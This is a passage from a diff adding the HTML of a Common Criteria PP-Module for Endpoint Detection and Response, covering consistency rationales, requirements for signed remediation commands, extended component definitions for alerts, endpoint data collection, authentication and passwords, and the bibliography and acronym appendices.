+      <table><tr><th><abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> Operational Environment Objective</th><th>Consistency Rationale</th></tr><tr><td><a href="#OE.RELIABLE_TRANSIT">OE.RELIABLE_TRANSIT</a></td><td> This objective relates to an external interface that does not exist in the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>
+          and does not affect <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> functionality<a href="#period_290" id="period_290">. </a></td></tr></table></p><h3 class="indexable" data-level="3" id="conreq-App">6.1.4 
+	Consistency of Requirements
+      </h3>
+      This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> identifies several SFRs from the
+      App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> that are needed to support
+      Endpoint Detection and Response (<abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>) functionality<a href="#period_291" id="period_291">. </a>      This is considered to be consistent because the functionality provided by the
+      App PPis being used for its intended purpose<a href="#period_292" id="period_292">. </a>      
+          The rationale for why this does not conflict with the claims
+      defined by the
+      App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> are as follows:
+      <table><tr><th><abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> Requirement</th><th>Consistency Rationale</th></tr><tr><th colspan="2"> Modified SFRs</th></tr><tr><td colspan="2" style="text-align:center">
+	    This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> does not modify any requirements when the
+	    App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> is the base<a href="#period_293" id="period_293">. </a>	  </td></tr><tr><th colspan="2"> Mandatory SFRs</th><tr><td><a href="#FAU_ALT_EXT.1">FAU_ALT_EXT.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines auditable alerts for the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_294" id="period_294">. </a>It does not
+              impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_295" id="period_295">. </a></td></tr><tr><td><a href="#FAU_COL_EXT.1">FAU_COL_EXT.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines the minimum event data that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> collects
+              from a Host Agent<a href="#period_296" id="period_296">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_297" id="period_297">. </a></td></tr><tr><td><a href="#FAU_GEN.1/EDR">FAU_GEN.1/EDR</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines the minimum event data that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> server must
+              record about authorized management dashboard activity<a href="#period_298" id="period_298">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_299" id="period_299">. </a></td></tr><tr><td><a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines authentication mechanisms for the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_300" id="period_300">. </a>It does
+              not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_301" id="period_301">. </a></td></tr><tr><td><a href="#FIA_PWD_EXT.1">FIA_PWD_EXT.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines specific authentication criteria for
+              passwords<a href="#period_302" id="period_302">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_303" id="period_303">. </a></td></tr><tr><td><a href="#FMT_SMF.1/ENDPOINT">FMT_SMF.1/ENDPOINT</a></td><td>This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines a specific set of management functions for an
+              <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> by an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_304" id="period_304">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_305" id="period_305">. </a></td></tr><tr><td><a href="#FMT_SMF.1/HOST">FMT_SMF.1/HOST</a></td><td>This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines a specific set of management functions for a
+              Host Agent by an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_306" id="period_306">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_307" id="period_307">. </a></td></tr><tr><td><a href="#FMT_SMR.1">FMT_SMR.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines a specific set of management roles for an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_308" id="period_308">. </a>              It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_309" id="period_309">. </a></td></tr><tr><td><a href="#FMT_SRF_EXT.1">FMT_SRF_EXT.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines a specific set of remediation functions for an
+              <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_310" id="period_310">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_311" id="period_311">. </a></td></tr><tr><td><a href="#FPT_ITT.1">FPT_ITT.1</a></td><td> This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines a specific set of functions for logically distinct secure
+              communication with a Host Agent<a href="#period_312" id="period_312">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_313" id="period_313">. </a></td></tr><tr><td><a href="#FTP_TRP.1">FTP_TRP.1</a></td><td>This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines a specific set of functions for secure remote
+              administration of the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_314" id="period_314">. </a>It does not impact <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_315" id="period_315">. </a></td></tr></tr><tr><th colspan="2"> Optional SFRs</th><tr><td colspan="2" style="text-align:center">
+	      This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> does not define any optional requirements<a href="#period_316" id="period_316">. </a>	    </td></tr></tr><tr><th colspan="2"> Selection-based SFRs</th><tr><td colspan="2" style="text-align:center">
+	      This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> does not define any selection-based requirements<a href="#period_317" id="period_317">. </a>	    </td></tr></tr><tr><th colspan="2"> Objective SFRs</th><tr><td><a href="#FMT_TRM_EXT.1">FMT_TRM_EXT.1</a></td><td>This <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> defines protections for the integrity of commands sent to
+            the Host Agent<a href="#period_318" id="period_318">. </a>It does not impact the <a href="#bibAppPP">[AppPP]</a> functionality<a href="#period_319" id="period_319">. </a></td></tr></tr></table><h1 class="indexable" data-level="A" id="opt-sfrs">Appendix A -  Optional SFRs</h1><p>
+	  This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> does not define any optional SFRs<a href="#period_320" id="period_320">. </a>	</p><h1 class="indexable" data-level="A" id="sel-sfrs">Appendix B -  Selection-based SFRs</h1><p>
+	  This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> does not define any selection-based SFRs<a href="#period_321" id="period_321">. </a>	</p><h1 class="indexable" data-level="A" id="obj-sfrs">Appendix C -  Objective SFRs</h1>
+    This section is reserved for requirements that are not currently prescribed by this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>
+    but are expected to be included in future versions of the <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_322" id="period_322">. </a>    Vendors planning on having evaluations performed against future products are encouraged
+    to plan for these objective requirements to be met<a href="#period_323" id="period_323">. </a><br><br><div class="comp" id="FMT_TRM_EXT.1"><h4>FMT_TRM_EXT.1 Trusted Remediation Functions</h4>
+          
+          
+          
+          
+          
+          
+          
+          
+            
+            <div class="element"><div class="reqid" id="FMT_TRM_EXT.1.1"><a class="abbr" href="#FMT_TRM_EXT.1.1">FMT_TRM_EXT.1.1</a></div><div class="reqdesc">
+              The 
+                [<b>selection</b>: <i><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></i>, <i><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> Platform</i>] 
+                shall digitally sign commands and policies sent to the Host Agent using
+                [<b>selection</b>: <i>RSA</i>, <i>ECDSA</i>] signatures that meet FIPS PUB 186-4<a href="#period_324" id="period_324">. </a>              
+            
+            <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> The intent of this requirement is to cryptographically tie any policy updates or
+            commands sent to the Host Agent as being from the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_325" id="period_325">. </a>This is not to 
+            protect the policies in transit as they are already protected by <a href="#FPT_ITT.1">FPT_ITT.1</a><a href="#period_326" id="period_326">. </a>
+            If the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> implements this function, any signature algorithms used should be consistent with any selections made in 
+            FCS_COP.1(3)<a href="#period_327" id="period_327">. </a></span></div>
+            <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+              <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall check to ensure that the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> describes how all commands and policies are signed<a href="#period_328" id="period_328">. </a><p></p>
+              <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance and ensure that the
+                <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> any configuration information for policy signing is included<a href="#period_329" id="period_329">. </a>              <p></p>
+              <div class="eacategory">Tests</div>The evaluator shall select any one remediation function documented in the
+                administrative guide (e.g., terminate process), and execute that command
+                while capturing traffic<a href="#period_330" id="period_330">. </a>The evaluator shall review captured network traffic and
+                verify that a digital signature was sent along with the coinciding command or policy update<a href="#period_331" id="period_331">. </a>                The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> may need to be configured in a manner to disable transport
+                encryption for this test or the network capture tool may need to be
+                configured with the private key such that decrypted traffic can be made
+                available to the evaluator<a href="#period_332" id="period_332">. </a>              
+            </i></div></div>
+          </div></div>
+        </div><h1 class="indexable" data-level="A" id="ext-comp-defs">Appendix D -  Extended Component Definitions</h1>
+This appendix contains the definitions for the extended requirements that are used in the <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>
+including those used in Appendices A through C<a href="#period_333" id="period_333">. </a>
+
+    <h2 class="indexable" data-level="2" id="ext-comp-defs-bg">D.1 Background and Scope</h2>
+This appendix provides a definition for all of the extended components introduced
+in this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_334" id="period_334">. </a>
+
+These components are identified in the following table:
+
+<table><tr><th>Functional Class</th><th>Functional Components</th></tr><tr><td>Security Audit (FAU)</td><td>FAU_ALT_EXT Server Alerts<br>FAU_COL_EXT Collected Endpoint Data<br></td></tr><tr><td>Identification and Authentication (FIA)</td><td>FIA_AUT_EXT Dashboard Authentication Mechanisms<br>FIA_PWD_EXT Password Authentication<br></td></tr><tr><td>Security Management (FMT)</td><td>FMT_SRF_EXT Specification of Remediation Functions<br>FMT_TRM_EXT Trusted Remediation Functions<br></td></tr></table><h2 class="indexable" data-level="2" id="ext-comp-defs-bg">D.2 Extended Component Definitions</h2><h3>FAU_ALT_EXT Server Alerts</h3>Components in this family define requirements for system activity that causes the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> to generate an alert of the activity and for the contents of these alerts<a href="#period_335" id="period_335">. </a><h3>Component Leveling</h3><p><a href="#FAU_ALT_EXT.1">FAU_ALT_EXT.1</a>,
+             Server Alerts,
+              describes alert triggers and the information contained in alerts<a href="#period_336" id="period_336">. </a></p><h3>Management: FAU_ALT_EXT.1</h3><p>The following actions could be considered for the management functions in FMT: <ul>
+              <li>Configure visual suppression of alerts<a href="#period_337" id="period_337">. </a></li>
+            </ul></p><h3>Audit: FAU_ALT_EXT.1</h3><p>There are no auditable events foreseen<a href="#period_338" id="period_338">. </a></p><h3>FAU_ALT_EXT.1 Server Alerts</h3><p>Hierarchical to: No other components<a href="#period_339" id="period_339">. </a></p><p>Dependencies to: No dependencies<a href="#period_340" id="period_340">. </a></p><h3>FAU_ALT_EXT.1.1</h3><br>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall alert authorized users on a management dashboard
+                in the event of any of the following: <ol type="a">
+                  <li>Change in Host Agent enrollment status,</li>
+                  <li>Detection of potentially unauthorized activity on enrolled endpoints<a href="#period_341" id="period_341">. </a></li>
+                </ol>
+              <h3>FAU_ALT_EXT.1.2</h3><br>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall provide a visualization of detected alerts of
+                potentially unauthorized incidents, and shall include: <ol type="a">
+                  <li>An initial incident severity and [<b>selection</b>: <i>assessment</i>, <i>categorization</i>, <i>score</i>, <i>ranking</i>],</li>
+                  <li>An incident timeline<a href="#period_342" id="period_342">. </a></li>
+                </ol>
+              <h3>FAU_ALT_EXT.1.3</h3><br>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall provide a data export capability for
+                    selected alerts with a specified standards-based format of 
+                    [<b>assignment</b>: <span class="assignable-content">alert format</span>]<a href="#period_343" id="period_343">. </a>                 <h3>FAU_COL_EXT Collected Endpoint Data</h3>Components in this family define requirements for the data that is collected from a Host Agent<a href="#period_344" id="period_344">. </a><h3>Component Leveling</h3><p><a href="#FAU_COL_EXT.1">FAU_COL_EXT.1</a>,
+             Collected Endpoint Data,
+              identifies the specific data collected from a Host Agent<a href="#period_345" id="period_345">. </a></p><h3>Management: FAU_COL_EXT.1</h3><p>The following actions could be considered for the management functions in FMT: <ul>
+              <li>Configuration of the time period for transmission of collected data<a href="#period_346" id="period_346">. </a></li>
+              <li>Configuration of label or tag information to associate collected data with individual endpoint systems or groups of systems<a href="#period_347" id="period_347">. </a></li>
+            </ul></p><h3>Audit: FAU_COL_EXT.1</h3><p>There are no auditable events foreseen<a href="#period_348" id="period_348">. </a></p><h3>FAU_COL_EXT.1 Collected Endpoint Data</h3><p>Hierarchical to: No other components<a href="#period_349" id="period_349">. </a></p><p>Dependencies to: No dependencies<a href="#period_350" id="period_350">. </a></p><h3>FAU_COL_EXT.1.1</h3><br>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall collect the following minimum set of endpoint
+                data from a Host Agent: <ol type="a">
+                  <li>Operating System (<abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr>) version, architecture, and <abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr> Address,</li>
+                  <li>Privileged and unprivileged endpoint account login activity,</li>
+                  <li>Process creation,</li>
+                  <li>Libraries and modules loaded by processes,</li>
+                  <li>Filenames and [<b>assignment</b>: <span class="assignable-content">other metadata</span>] of files created and [<b>assignment</b>: <span class="assignable-content">other activities performed to files</span>] on persistent storage,</li>
+                  <li>[<b>assignment</b>: <span class="assignable-content">Other host data</span>]<a href="#period_351" id="period_351">. </a></li>
+                </ol>
+              <h3>FIA_AUT_EXT Dashboard Authentication Mechanisms</h3>Components in this family define requirements for authentication behavior that is unique to an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_352" id="period_352">. </a><h3>Component Leveling</h3><p><a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>,
+             Dashboard Authentication Mechanisms,
+              identifies the only authentication factors that may be used for authentication to a management interface of an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_353" id="period_353">. </a></p><h3>Management: FIA_AUT_EXT.1</h3><p>No specific management functions are identified<a href="#period_354" id="period_354">. </a></p><h3>Audit: FIA_AUT_EXT.1</h3><p>There are no auditable events foreseen<a href="#period_355" id="period_355">. </a></p><h3>FIA_AUT_EXT.1 Dashboard Authentication Mechanisms</h3><p>Hierarchical to: No other components<a href="#period_356" id="period_356">. </a></p><p>Dependencies to: No dependencies<a href="#period_357" id="period_357">. </a></p><h3>FIA_AUT_EXT.1.1</h3><br> The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall 
+                [<b>selection</b>: <ul><li><i>leverage the platform for authentication</i>, </li><li><i>provide authentication based on username/password and [<b>selection</b>: <ul><li><i>authentication with external smart card and PIN</i>, </li><li><i>no other factors</i></li></ul>]</i></li></ul>] to support logins to any management dashboard or <abbr class="dyn-abbr"><a href="#abbr_API">API</a></abbr><a href="#period_358" id="period_358">. </a><h3>FIA_PWD_EXT Password Authentication</h3>Components in this family define requirements for password authentication criteria<a href="#period_359" id="period_359">. </a><h3>Component Leveling</h3><p><a href="#FIA_PWD_EXT.1">FIA_PWD_EXT.1</a>,
+             Password Authentication,
+              defines the length and character set requirements for password authentication factors<a href="#period_360" id="period_360">. </a></p><h3>Management: FIA_PWD_EXT.1</h3><p>No specific management functions are identified<a href="#period_361" id="period_361">. </a></p><h3>Audit: FIA_PWD_EXT.1</h3><p>There are no auditable events foreseen<a href="#period_362" id="period_362">. </a></p><h3>FIA_PWD_EXT.1 Password Authentication</h3><p>Hierarchical to: No other components<a href="#period_363" id="period_363">. </a></p><p>Dependencies to: <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a> Dashboard Authentication Mechanisms</p><h3>FIA_PWD_EXT.1.1</h3><br>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall support the following for the Password
+                Authentication Factor: <ol>
+                  <li>Passwords shall be able to be composed of any combination of [<b>selection</b>: <i>upper and lower case letters</i>, <i>[<b>assignment</b>: <span class="assignable-content">a character set of at least 52
+                        characters</span>]</i>], numbers, and special characters: [<b>selection</b>: <i>"!"</i>, <i>"@"</i>, <i>"#"</i>, <i>"$"</i>, <i>"%"</i>, <i>"^"</i>, <i>"&amp;"</i>, <i> "*"</i>, <i>"("</i>, <i>")"</i>, <i>[<b>assignment</b>: <span class="assignable-content">other characters</span>]</i>],
+                  </li>
+                  <li>Password length up to [<b>assignment</b>: <span class="assignable-content">an integer greater than or equal to
+                      64</span>] characters shall be supported<a href="#period_364" id="period_364">. </a></li>
+                </ol>
+              <h3>FMT_SRF_EXT Specification of Remediation Functions</h3>Components in this family define requirements for remediation functions that an <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> can perform to affect the behavior of an endpoint system<a href="#period_365" id="period_365">. </a><h3>Component Leveling</h3><p><a href="#FMT_SRF_EXT.1">FMT_SRF_EXT.1</a>,
+             Specification of Remediation Functions,
+              lists the supported remediation functions and identifies the management roles that may perform these functions<a href="#period_366" id="period_366">. </a></p><h3>Management: FMT_SRF_EXT.1</h3><p>No specific management functions are identified<a href="#period_367" id="period_367">. </a></p><h3>Audit: FMT_SRF_EXT.1</h3><p>There are no auditable events foreseen<a href="#period_368" id="period_368">. </a></p><h3>FMT_SRF_EXT.1 Specification of Remediation Functions</h3><p>Hierarchical to: No other components<a href="#period_369" id="period_369">. </a></p><p>Dependencies to: <a href="#FMT_SMR.1">FMT_SMR.1</a> Security Management Roles</p><h3>FMT_SRF_EXT.1.1</h3><br> The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall be capable of performing the following
+                remediation functions: <br>
+                <table class="mfs" style="width: 100%;"><tr class="header"><td>Management Function</td><td>Administrator</td><td>SOC Analyst</td><td>Read-Only User</td></tr><tr><td> Quarantine an endpoint by 
+                      [<b>selection</b>: <i>logically quarantining the endpoint from the network unless allowlisted</i>, <i>quarantining the malicious file on the endpoint</i>] </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td> Terminate a running process on an endpoint </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td> Retrieve potentially unauthorized or affected files from an endpoint </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr></table>
+              <h3>FMT_TRM_EXT Trusted Remediation Functions</h3>Components in this family define how the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> can assert the authenticity of the remediation actions it requests from Host Agents<a href="#period_370" id="period_370">. </a><h3>Component Leveling</h3><p><a href="#FMT_TRM_EXT.1">FMT_TRM_EXT.1</a>,
+             Trusted Remediation Functions,
+              requires all management activities bound for a Host Agent to be digitally signed<a href="#period_371" id="period_371">. </a></p><h3>Management: FMT_TRM_EXT.1</h3><p>No specific management functions are identified<a href="#period_372" id="period_372">. </a></p><h3>Audit: FMT_TRM_EXT.1</h3><p>There are no auditable events foreseen<a href="#period_373" id="period_373">. </a></p><h3>FMT_TRM_EXT.1 Trusted Remediation Functions</h3><p>Hierarchical to: No other components<a href="#period_374" id="period_374">. </a></p><p>Dependencies to: No dependencies<a href="#period_375" id="period_375">. </a></p><h3>FMT_TRM_EXT.1.1</h3><br>The 
+                [<b>selection</b>: <i><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></i>, <i><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> Platform</i>] 
+                shall digitally sign commands and policies sent to the Host Agent using
+                [<b>selection</b>: <i>RSA</i>, <i>ECDSA</i>] signatures that meet FIPS PUB 186-4<a href="#period_376" id="period_376">. </a>              <h1 class="indexable" data-level="A" id="satisfiedreqs">Appendix E -  Implicitly Satisfied Requirements</h1><p>
+This appendix lists requirements that should be considered satisfied by products
+successfully evaluated against this Protection Profile<a href="#period_377" id="period_377">. </a>  
+However, these requirements are not featured explicitly as SFRs and should not be
+included in the <abbr title="Security Target">ST</abbr><a href="#period_378" id="period_378">. </a>They are not included as standalone SFRs because it would
+increase the time, cost, and complexity of evaluation<a href="#period_379" id="period_379">. </a>This approach is permitted
+by <a href="#bibCC">[CC]</a> Part 1, <b>8.2 Dependencies between components</b><a href="#period_380" id="period_380">. </a>    </p><p>
+This information benefits systems engineering activities which call for inclusion of
+particular security controls<a href="#period_381" id="period_381">. </a> Evaluation against the Protection Profile
+provides evidence that these controls are present and have been evaluated<a href="#period_382" id="period_382">. </a>    </p>
+    <table>
+      <tr class="header">
+        <td>Requirement</td>
+        <td>Rationale for Satisfaction</td>
+      </tr>
+      <tr>
+        <td>FIA_UID.1 - Timing of Identification</td>
+        <td>
+          <abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr> Part 2 specifies FIA_UID.1 as a dependency of <a href="#FMT_SMR.1">FMT_SMR.1</a> because the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> must have some way of identifying users so that they can be associated with management roles<a href="#period_383" id="period_383">. </a>
+          This dependency is implicitly addressed through <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>, which specifies an alternative method of user identification<a href="#period_384" id="period_384">. </a>        </td>
+      </tr>
+      <tr>
+        <td>FPT_STM.1 - Reliable Time Stamps</td>
+        <td>
+          <abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr> Part 2 specifies FPT_STM.1 as a dependency of FAU_GEN.1 because the audit records require a reliable timestamp to satisfy FAU_GEN.1.2<a href="#period_385" id="period_385">. </a>
+          This dependency is implicitly addressed through the A.PLATFORM assumption of the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> because a "trustworthy computing platform" is assumed to include a reliable system clock<a href="#period_386" id="period_386">. </a>        </td>
+      </tr>
+    </table>
+    
+  <h1 class="indexable" data-level="A" id="bibliography">Appendix F -  Bibliography</h1><table><tr class="header"><th>Identifier</th><th>Title</th></tr><tr><td><span id="bibCC"> [<abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr>] </span></td><td>Common Criteria for Information Technology Security Evaluation - 
+    <ul><li><a href="http://www.commoncriteriaportal.org/files/ccfiles/CCPART1V3.1R5.pdf">Part
+             1: Introduction and General Model</a>,
+             CCMB-2017-04-001, Version 3.1, Revision 5,  April 2017<a href="#period_387" id="period_387">. </a>         </li><li><a href="http://www.commoncriteriaportal.org/files/ccfiles/CCPART2V3.1R5.pdf">Part
+             2: Security Functional Components</a>,
+             CCMB-2017-04-002, Version 3.1, Revision 5,  April 2017<a href="#period_388" id="period_388">. </a>         </li><li><a href="http://www.commoncriteriaportal.org/files/ccfiles/CCPART3V3.1R5.pdf">Part
+             3: Security Assurance Components</a>,
+             CCMB-2017-04-003, Version 3.1, Revision 5,  April 2017<a href="#period_389" id="period_389">. </a>         </li></ul></td></tr><tr><td><span id="bibAppPP"> [AppPP] </span></td><td>
+        <a href="https://www.niap-ccevs.org/MMO/PP/-429-/">Protection Profile for Application
+          Software</a>, Version 1.3, March 1, 2019
+      </td></tr><tr><td><span id="bibHAGT"> [Host Agent] </span></td><td>
+        <a href="https://commoncriteria.github.io/pp/esm-hostagent/esm-hostagent-release.html">PP-Module for Host Agent</a>, Version 1.0, October 23rd 2020
+      </td></tr></table><h1 class="indexable" data-level="A" id="acronyms">Appendix G -  Acronyms</h1><table><tr class="header"><th>Acronym</th><th>Meaning</th></tr><tr><td><span class="term" id="abbr_API"><abbr class="dyn-abbr"><a href="#abbr_API">API</a></abbr></span></td><td><span id="long_abbr_API">Application Programming Interface</span></td></tr><tr><td><span class="term" id="abbr_Base-PP"><abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr></span></td><td><span id="long_abbr_Base-PP">Base Protection Profile</span></td></tr><tr><td><span class="term" id="abbr_CC"><abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr></span></td><td><span id="long_abbr_CC">Common Criteria</span></td></tr><tr><td><span class="term" id="abbr_CEF"><abbr class="dyn-abbr"><a href="#abbr_CEF">CEF</a></abbr></span></td><td><span id="long_abbr_CEF">Common Event Format</span></td></tr><tr><td><span class="term" id="abbr_CEM"><abbr class="dyn-abbr"><a href="#abbr_CEM">CEM</a></abbr></span></td><td><span id="long_abbr_CEM">Common Evaluation Methodology</span></td></tr><tr><td><span class="term" id="abbr_CybOX"><abbr class="dyn-abbr"><a href="#abbr_CybOX">CybOX</a></abbr></span></td><td><span id="long_abbr_CybOX">Cyber Observable eXpression</span></td></tr><tr><td><span class="term" id="abbr_DRBG"><abbr class="dyn-abbr"><a href="#abbr_DRBG">DRBG</a></abbr></span></td><td><span id="long_abbr_DRBG">Deterministic Random Bit Generator</span></td></tr><tr><td><span class="term" id="abbr_DSS"><abbr class="dyn-abbr"><a href="#abbr_DSS">DSS</a></abbr></span></td><td><span id="long_abbr_DSS">Digital Signature Standard</span></td></tr><tr><td><span class="term" id="abbr_DTLS"><abbr class="dyn-abbr"><a href="#abbr_DTLS">DTLS</a></abbr></span></td><td><span id="long_abbr_DTLS">Datagram Transport Layer Security</span></td></tr><tr><td><span class="term" id="abbr_EDR"><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></span></td><td><span id="long_abbr_EDR">Endpoint Detection and Response</span></td></tr><tr><td><span class="term" id="abbr_EDR"><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></span></td><td><span id="long_abbr_EDR">Endpoint Detection and Response</span></td></tr><tr><td><span class="term" id="abbr_HTTPS"><abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr></span></td><td><span id="long_abbr_HTTPS">Hypertext Transfer Protocol Secure</span></td></tr><tr><td><span class="term" id="abbr_IODEF"><abbr class="dyn-abbr"><a href="#abbr_IODEF">IODEF</a></abbr></span></td><td><span id="long_abbr_IODEF">Incident Object Description Exchange Format</span></td></tr><tr><td><span class="term" id="abbr_IP"><abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr></span></td><td><span id="long_abbr_IP">Internet Protocol</span></td></tr><tr><td><span class="term" id="abbr_IT"><abbr class="dyn-abbr"><a href="#abbr_IT">IT</a></abbr></span></td><td><span id="long_abbr_IT">Information Technology</span></td></tr><tr><td><span class="term" id="abbr_LEEF"><abbr class="dyn-abbr"><a href="#abbr_LEEF">LEEF</a></abbr></span></td><td><span id="long_abbr_LEEF">Log Event Extended Format</span></td></tr><tr><td><span class="term" id="abbr_OE"><abbr class="dyn-abbr"><a href="#abbr_OE">OE</a></abbr></span></td><td><span id="long_abbr_OE">Operational Environment</span></td></tr><tr><td><span class="term" id="abbr_OS"><abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr></span></td><td><span id="long_abbr_OS">Operating System</span></td></tr><tr><td><span class="term" id="abbr_PP"><abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr></span></td><td><span id="long_abbr_PP">Protection Profile</span></td></tr><tr><td><span class="term" id="abbr_PP-Configuration"><abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr></span></td><td><span id="long_abbr_PP-Configuration">Protection Profile Configuration</span></td></tr><tr><td><span 